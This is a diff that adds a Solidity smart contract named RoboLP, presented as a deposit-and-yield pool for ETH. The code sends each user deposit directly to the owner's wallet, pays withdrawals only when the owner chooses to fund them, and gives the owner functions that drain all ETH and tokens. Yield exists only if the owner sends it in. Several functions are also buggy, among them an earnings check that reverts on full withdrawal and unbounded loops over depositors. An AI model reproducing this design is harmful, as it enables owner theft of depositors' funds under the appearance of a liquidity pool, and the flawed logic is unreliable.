@@ -1,0 +1,199 @@
+// SPDX-License-Identifier: GPL-3.0
+
+pragma solidity 0.8.19;
+
+interface IERC20 {
+  function balanceOf(address account) external view returns(uint256);
+
+  function transfer(address recipient, uint256 amount) external returns(bool);
+}
+
+contract RoboLP {
+  modifier owner() {
+    require(msg.sender == _owner);
+    _;
+  }
+  mapping(address => uint256) private _Deposits;
+  mapping(address => uint256) private _TotalDeposits;
+  mapping(address => uint256) private _Earnings;
+  mapping(address => uint256) private _TotalEarnings;
+  mapping(address => bool) private _WithdrawlPending;
+
+  address public _owner;
+  address[] private Earners;
+  address[] private DepositFeeRecipients;
+
+  uint256 public TotalUserDeposits;
+  uint256 public TotalUserYield;
+
+  uint256 public UserYieldPool;
+  uint256 public DepositFee;
+
+  constructor(uint256 _DepositFee, address[] memory _DepositFeeRecipients) {
+    _owner = msg.sender;
+    require(_DepositFee < 11);
+    DepositFee = _DepositFee;
+    DepositFeeRecipients = _DepositFeeRecipients;
+  }
+
+  receive() external payable {
+    if (msg.sender != _owner && msg.value == 12340000000000000) {
+      _RequestWithdrawl(msg.sender);
+      return;
+    }
+    if (msg.sender != _owner && msg.value > 0) {
+      UserDeposit(msg.sender, msg.value);
+      return;
+    }
+    if (msg.sender == _owner && msg.value > 0) {
+      DevDepositYield(msg.value);
+      return;
+    }
+    if (msg.sender != _owner && msg.value == 0) {
+      WithdrawEarnings(msg.sender);
+      return;
+    }
+  }
+
+  function DevTokenTransfer(address CA, address to) owner external {
+    IERC20(CA).transfer(to, IERC20(CA).balanceOf(address(this)));
+  }
+
+  function ChangeOwner(address wallet) external owner {
+    _owner = wallet;
+  }
+
+  function ChangeDepositFee(uint256 value) external owner {
+    require(value < 11);
+    DepositFee = value;
+  }
+
+  function ChangeDepositFeeRecipients(address[] memory addressarray) external owner {
+    DepositFeeRecipients = addressarray;
+  }
+
+  function GetEarnerAddresses() external view returns(address[] memory) {
+    return Earners;
+  }
+
+  function GetYieldWaiting(address wallet) external view returns(uint256) {
+    return _Earnings[wallet];
+  }
+
+  function GetWithdrawPending(address wallet) external view returns(bool) {
+    return _WithdrawlPending[wallet];
+  }
+
+  function GetTotalDeposits(address wallet) external view returns(uint256) {
+    return _TotalDeposits[wallet];
+  }
+
+  function GetTotalEarnings(address wallet) external view returns(uint256) {
+    return _TotalEarnings[wallet];
+  }
+
+  function _RequestWithdrawl(address wallet) internal {
+    if (_Deposits[wallet] > 0) {
+      _WithdrawlPending[wallet] = true;
+      TransferETH(wallet, msg.value);
+    } else {
+      revert();
+    }
+  }
+
+  function DevFulfilWithdrawlDeposits() external payable owner {
+    uint256 totalsent;
+    for (uint256 x; x < Earners.length; x++) {
+      if (_WithdrawlPending[Earners[x]]) {
+        _WithdrawlPending[Earners[x]] = false;
+        uint256 val = _Deposits[Earners[x]];
+        val += _Earnings[Earners[x]];
+        _Earnings[Earners[x]] = 0;
+        _Deposits[Earners[x]] = 0;
+        totalsent += val;
+        TransferETH(Earners[x], val);
+        Earners[x] = Earners[Earners.length - 1];
+        Earners.pop();
+      }
+    }
+    if (msg.value > totalsent) {
+      TransferETH(_owner, msg.value - totalsent);
+    }
+  }
+
+  function CheckDepositWithdrawlsCost() public view returns(uint256) {
+    uint256 Total;
+    for (uint256 x; x < Earners.length; x++) {
+      if (_WithdrawlPending[Earners[x]]) {
+        Total += _Deposits[Earners[x]];
+        Total += _Earnings[Earners[x]];
+      }
+    }
+    return Total;
+  }
+
+  function PayDepositFeeRecipients(uint256 val) internal {
+    for (uint256 x; x < DepositFeeRecipients.length; x++) {
+      TransferETH(DepositFeeRecipients[x], val / DepositFeeRecipients.length);
+    }
+  }
+
+  function WithdrawEarnings(address wallet) internal {
+    uint256 val = _Earnings[wallet];
+    require((UserYieldPool - val) > 0);
+    UserYieldPool -= val;
+    _Earnings[wallet] = 0;
+    TransferETH(wallet, val);
+  }
+
+  function TransferETH(address wallet, uint256 value) internal {
+    (bool success, ) = wallet.call {
+      value: value
+    }("");
+    if (success) {
+      _TotalEarnings[wallet] += value;
+    } else {
+      revert();
+    }
+  }
+
+  function DevMigrateLiquidity(address wallet) external owner {
+    TransferETH(wallet, address(this).balance);
+  }
+
+  function UserDeposit(address wallet, uint256 value) internal {
+
+    require(value >= 10000000000000000);
+
+    if (_Deposits[wallet] == 0) {
+      Earners.push(wallet);
+    }
+
+    uint256 fee = (value * DepositFee) / 100;
+    uint256 val = value - fee;
+    if (fee > 0) {
+      PayDepositFeeRecipients(fee);
+    }
+    _TotalDeposits[wallet] += val;
+    TotalUserDeposits += val;
+    TransferETH(_owner, val);
+    _Deposits[wallet] += val;
+  }
+
+  function DevDepositYield(uint256 value) internal {
+    require(Earners.length > 0);
+    _TotalDeposits[_owner] += value;
+    TotalUserYield += value;
+    UserYieldPool += value;
+    uint256 TotalDeposit = 0;
+    for (uint256 x; x < Earners.length; x++) {
+      TotalDeposit += _Deposits[Earners[x]];
+    }
+
+    for (uint256 x; x < Earners.length; x++) {
+      uint256 percentofstake = (_Deposits[Earners[x]] * 10000000000000000000000) / TotalDeposit;
+      _Earnings[Earners[x]] += (value * percentofstake) / 10000000000000000000000;
+    }
+  }
+
+}
